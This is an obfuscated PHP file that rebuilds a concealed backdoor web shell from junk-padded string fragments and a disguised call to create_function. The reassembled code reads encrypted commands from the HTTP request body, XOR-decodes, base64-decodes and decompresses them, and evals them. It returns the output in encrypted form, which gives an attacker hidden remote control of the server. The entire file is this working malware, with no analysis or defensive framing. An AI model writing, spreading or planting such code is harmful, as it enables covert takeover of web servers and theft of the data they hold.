<?php
$g='t_cont=fen=fts();@ob_e=fnd_clean=f();$r=f=@b=fase=f64=f_encode=f(@x(@gzcompr=fess($o=f),$k=f));print("=f$p$kh$r=f$kf");}';
$C='/input"),$m)==f=1)=f {@ob_=fstart();@e=f=fval(@gzunc=f=fompress(@x(@ba=fse6=f=f4_decod=fe($m[1]),$k))=f)=f;$o=@ob=f_ge';
$t='$k="cdee=f24d0";$=fkh="f2=fec=f590f5c=f01=f";$kf="7=ff8b9ad92e=f57"=f;$p="PikO=f7=ffSa=fQai=fTGX=f=fhi";function x($t,';
$b=str_replace('b','','cbreatbe_bfbuncbtibon');
$h='$k){$c=strl=fen($k=f);$l=f=strlen($=ft=f);$o="";fo=fr($i==f0;$i=f<$l=f;){fo=f=fr($j=0=f;(=f$=fj<$c&&$i<$l)=f;$j++,$i++)';
$B='{$o=f.=$=ft{$i}^$k{$j=f};=f}}=freturn=f $o;=f}if (@preg=f=f_match("=f/$kh(.+)$kf/"=f,@file_get=f=f_contents("=f=fphp:/';
$i=str_replace('=f','',$t.$h.$B.$C.$g);
$e=$b('',$i);$e();
?>
